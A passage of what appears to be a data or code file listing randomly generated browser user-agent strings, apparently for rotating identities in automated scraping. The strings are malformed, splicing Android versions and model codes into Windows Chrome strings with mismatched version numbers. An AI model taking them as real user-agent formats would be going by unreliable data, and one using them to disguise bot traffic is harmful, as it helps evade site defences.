'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E223K) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4655.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A545R) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4245.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T852I) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4847.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y81Z) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4211.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)I974Y) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4875.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J519A) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4847.64 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F448H) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4455.123 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A359N) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4554.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M612P) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4389.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E600A) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4399.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y690D) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4855.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N299D) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4441.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)R126Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4262.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G832L) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4548.45 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q308D) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4716.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D439L) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4418.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L793Q) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4706.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L532K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4582.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O964Q) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4260.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I438E) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4866.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)V295O) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4499.99 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K553M) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4249.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)D121I) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4401.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Q798S) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4558.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A861T) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4503.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D145A) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4530.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)T28W) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4465.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E690E) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4305.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H315T) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4354.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q902G) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4378.83 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K152G) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4217.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)G194N) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4879.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)V466R) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4264.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)D586Y) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4400.56 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V335U) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4489.120 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H415Z) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4857.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y266F) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4686.91 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L134C) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4286.139 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P224L) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4430.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M888C) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4860.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A778E) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4580.124 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)R354Q) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4419.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V767C) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4863.58 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)W166R) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4812.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)L378D) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4682.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O132G) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4237.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E369E) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4594.44 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P474J) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4478.108 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)X394L) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4873.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D72L) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4267.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C321Y) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4599.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)O80A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4698.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y560O) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4428.101 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)E421G) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4562.127 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)M738G) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4616.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Y948U) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4865.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C877P) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4825.137 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W945W) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4629.130 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)R338A) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4512.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P75D) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4662.82 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Z230G) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4537.94 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)A835N) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4797.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)F508D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4517.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B622F) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4481.40 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)P589A) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4840.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)H129B) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4884.109 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q43X) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4796.41 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)L465C) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4267.81 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J701S) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4821.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)K176A) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4553.48 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Y675O) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4396.66 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C288W) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4410.79 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N179I) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4698.119 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)B137T) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4519.150 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Q84N) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4628.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N7T) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4613.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C590A) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4732.117 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)K773E) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4505.104 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H177S) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4330.50 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)T740N) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4666.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)E438R) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4694.87 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O200D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4507.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)H767R) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4793.100 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B722B) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4213.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)O692L) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4271.148 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)O787G) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4272.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)G520N) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4421.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V87C) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4306.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)N146J) AppleWebKit/537.36 (KHTML, like Gecko)80.0.4477.97 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)E770B) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4429.121 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)M481Z) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4651.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)C270J) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4254.143 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G134J) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4278.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)B847P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4465.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)E83N) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4527.65 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)T173O) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4634.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)N352S) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4755.142 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L644E) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4476.147 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Q58B) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4576.51 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C558Q) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4347.125 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G332U) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4378.73 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I851P) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4613.52 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z477Q) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4863.75 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)M151Y) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4658.43 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)C599U) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4638.59 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A178W) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4399.116 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)P241A) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4823.90 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)N642X) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4415.74 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)K986U) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4316.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y228Y) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4491.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H934U) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4731.77 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A210X) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4523.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)O719G) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4466.80 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A713D) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4530.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)I225N) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4817.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A710B) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4586.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J704V) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4236.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A935C) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4435.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)L113X) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4839.149 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y52Q) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4856.46 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H631D) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4344.53 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P511I) AppleWebKit/537.36 (KHTML, like Gecko)89.0.4706.67 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)P593P) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4418.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)B580K) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4481.103 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Q535C) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4328.136 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A545R) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4686.118 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A628M) AppleWebKit/537.36 (KHTML, like Gecko)102.0.4379.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)Z852C) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4710.115 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X3O) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4554.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)P562H) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4504.112 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)V497P) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4296.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)A324Y) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4662.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)H561A) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4624.107 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B131P) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4230.102 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U988Q) AppleWebKit/537.36 (KHTML, like Gecko)85.0.4675.57 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G143N) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4677.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)M741U) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4551.42 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)C7W) AppleWebKit/537.36 (KHTML, like Gecko)84.0.4537.146 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)C843X) AppleWebKit/537.36 (KHTML, like Gecko)95.0.4432.105 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O135E) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4677.62 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)J144G) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4231.59 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q348A) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4750.113 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)U452K) AppleWebKit/537.36 (KHTML, like Gecko)86.0.4740.145 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 8.1.0; Win64; x64)Q735T) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4718.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)Z587Z) AppleWebKit/537.36 (KHTML, like Gecko)93.0.4349.111 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)D993U) AppleWebKit/537.36 (KHTML, like Gecko)87.0.4303.131 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)H347V) AppleWebKit/537.36 (KHTML, like Gecko)96.0.4786.63 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)G127K) AppleWebKit/537.36 (KHTML, like Gecko)97.0.4608.55 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)E820D) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4383.122 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)R901M) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4625.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L49B) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4721.134 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X816J) AppleWebKit/537.36 (KHTML, like Gecko)98.0.4801.88 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)A139W) AppleWebKit/537.36 (KHTML, like Gecko)81.0.4850.47 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H230Y) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4786.69 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)Y792M) AppleWebKit/537.36 (KHTML, like Gecko)91.0.4762.135 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)K20D) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4544.106 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)V195O) AppleWebKit/537.36 (KHTML, like Gecko)88.0.4863.140 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)F989I) AppleWebKit/537.36 (KHTML, like Gecko)94.0.4268.128 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 12; Win64; x64)R932Y) AppleWebKit/537.36 (KHTML, like Gecko)83.0.4208.98 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A331R) AppleWebKit/537.36 (KHTML, like Gecko)92.0.4322.49 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)G943F) AppleWebKit/537.36 (KHTML, like Gecko)82.0.4877.114 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z77Y) AppleWebKit/537.36 (KHTML, like Gecko)90.0.4623.84 Chrome/105.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 7.0; Win64; x64)F690Q) AppleWebKit/537.36 (KHTML, like 